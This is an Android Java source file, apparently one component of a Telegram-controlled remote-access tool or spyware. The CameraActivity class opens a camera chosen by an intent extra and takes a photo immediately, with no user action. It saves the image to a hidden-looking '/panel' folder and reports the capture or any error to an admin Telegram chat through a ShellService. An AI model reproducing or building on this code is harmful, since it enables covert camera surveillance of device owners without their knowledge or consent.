package com.java.panel;

import android.hardware.Camera;
import android.os.Bundle;
import android.os.Environment;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.FileOutputStream;

public class CameraActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private Camera camera;
    private SurfaceView surfaceView;
    private SurfaceHolder surfaceHolder;
    private int cameraId = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        cameraId = getIntent().getIntExtra("cam_id", 0);
        surfaceView = new SurfaceView(this);
        setContentView(surfaceView);

        surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(this);
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            camera = Camera.open(cameraId);
            camera.setPreviewDisplay(holder);
            camera.startPreview();
            camera.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(Environment.getExternalStorageDirectory(), "/panel/cam_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    if (ShellService.instance != null) {
                        ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "📸 Kamera görüntüsü kaydedildi: " + file.getAbsolutePath());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                releaseCamera();
                finish();
            });
        } catch (Exception e) {
            e.printStackTrace();
            if (ShellService.instance != null) {
                ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Kamera hatası: " + e.getMessage());
            }
            finish();
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
            } catch (Exception e) {
                e.printStackTrace();
            }
            camera = null;
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseCamera();
    }
}
